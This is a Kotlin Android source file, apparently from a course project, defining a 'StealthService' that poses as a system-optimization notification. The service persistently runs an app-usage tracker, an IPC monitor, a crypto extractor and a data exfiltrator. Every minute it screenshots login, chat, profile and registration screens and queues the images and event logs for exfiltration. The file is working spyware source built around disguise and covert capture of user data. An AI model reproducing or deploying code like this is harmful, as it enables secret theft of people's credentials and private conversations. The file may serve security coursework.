package com.example.inf2215

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.graphics.Bitmap
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.View
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream
import java.lang.ref.WeakReference
import java.text.SimpleDateFormat
import java.util.*
import android.util.Log

class StealthService : Service() {

    private val tag = "StealthService"
    private val notificationId = 1001
    private val channelId = "stealth_channel"

    private lateinit var usageTracker: AppUsageTracker
    private lateinit var ipcMonitor: IpcMonitor
    private lateinit var cryptoExtractor: CryptoExtractor
    private lateinit var exfiltrator: DataExfiltrator

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val mainHandler = Handler(Looper.getMainLooper())

    // Sensitive screens – adjust to match your activity names or tags
    private val sensitiveScreens = listOf(
        "RegisterScreen",
        "ProfileScreen",
        "PostScreen",
        "LoginScreen",
        "ChatScreen",
        "PostDetailScreen"
    )

    override fun onCreate() {
        super.onCreate()

        createNotificationChannel()
        startForegroundWithType()

        exfiltrator = DataExfiltrator.getInstance(this)
//        Log.d(tag, "exfiltrator initialized successfully")
        usageTracker = AppUsageTracker(this, exfiltrator)
        ipcMonitor = IpcMonitor(this, exfiltrator)
        cryptoExtractor = CryptoExtractor(this, exfiltrator)
//        Log.d(tag, "cryptoExtractor initialized with exfiltrator")

        usageTracker.startTracking()
        ipcMonitor.startMonitoring()
        cryptoExtractor.startExtraction()

        startScreenCheck()
    }

    private fun startForegroundWithType() {
        val notification = createNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) { // API 34
            startForeground(
                notificationId,
                notification,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(notificationId, notification)
        }
    }

    private fun createNotification(): Notification =
        NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Utilities")
            .setContentText("Optimizing system performance")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Background Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "System maintenance"
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun startScreenCheck() {
        serviceScope.launch {
            while (isActive) {
                checkCurrentScreen()
                delay(60000) // every 60 seconds – adjust as needed
            }
        }
    }

    private fun checkCurrentScreen() {
        val viewRef = CurrentViewHolder.currentRootView
        val view = viewRef?.get()
        if (view != null && view.isAttachedToWindow) {
            val activityName = CurrentViewHolder.currentActivityName ?: ""
            if (activityName in sensitiveScreens || shouldCapture(activityName)) {
                logEvent("SENSITIVE_SCREEN_VISIBLE", activityName)
                captureOwnView(view)
            }
        }
    }

    private fun captureOwnView(rootView: View) {
        mainHandler.post {
            Log.d("CaptureDebug", "captureOwnView called")
            val bitmap = rootView.drawToBitmap()
            if (bitmap != null) {
                Log.d("CaptureDebug", "bitmap captured: ${bitmap.width}x${bitmap.height}")
                serviceScope.launch {
                    val file = saveBitmap(bitmap)
                    if (file != null) {
                        Log.d("CaptureDebug", "file saved: ${file.absolutePath}")
                        exfiltrator.queueImage(file)
                        logEvent("OWN_VIEW_CAPTURE", file.name)
                    } else {
                        Log.e("CaptureDebug", "saveBitmap returned null")
                    }
                }
            } else {
                Log.e("CaptureDebug", "drawToBitmap returned null")
            }
        }
    }

    private fun View.drawToBitmap(): Bitmap? {
        return try {
            if (width == 0 || height == 0 || !isAttachedToWindow) return null
            val bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)
            val canvas = android.graphics.Canvas(bitmap)
            draw(canvas)
            bitmap
        } catch (e: Exception) {
            null
        }
    }

    private fun saveBitmap(bitmap: Bitmap): File? {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val filename = "own_capture_$timestamp.png"
        val dir = File(filesDir, "captures")
        if (!dir.exists() && !dir.mkdirs()) return null
        val file = File(dir, filename)
        return try {
            FileOutputStream(file).use { out ->
                bitmap.compress(Bitmap.CompressFormat.PNG, 90, out)
            }
            file
        } catch (e: Exception) {
            null
        }
    }

    private fun shouldCapture(activityName: String): Boolean {
        return activityName.contains("Chat", ignoreCase = true) ||
                activityName.contains("Profile", ignoreCase = true)
    }

    private fun logEvent(type: String, detail: String) {
        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
        val entry = "$timestamp - $type: $detail"
        saveToFile("events.log", entry)
        exfiltrator.queueData(entry)
    }

    private fun saveToFile(filename: String, data: String) {
        try {
            val dir = File(filesDir, "logs")
            if (!dir.exists()) dir.mkdirs()
            File(dir, filename).appendText("$data\n")
        } catch (_: Exception) { }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        serviceScope.cancel()
        usageTracker.stopTracking()
        ipcMonitor.stopMonitoring()
        cryptoExtractor.stopExtraction()
        exfiltrator.shutdown()
        super.onDestroy()
    }

    // Weak reference holder – updated by LifecycleObserver
    object CurrentViewHolder {
        var currentRootView: WeakReference<View>? = null
        var currentActivityName: String? = null
    }
}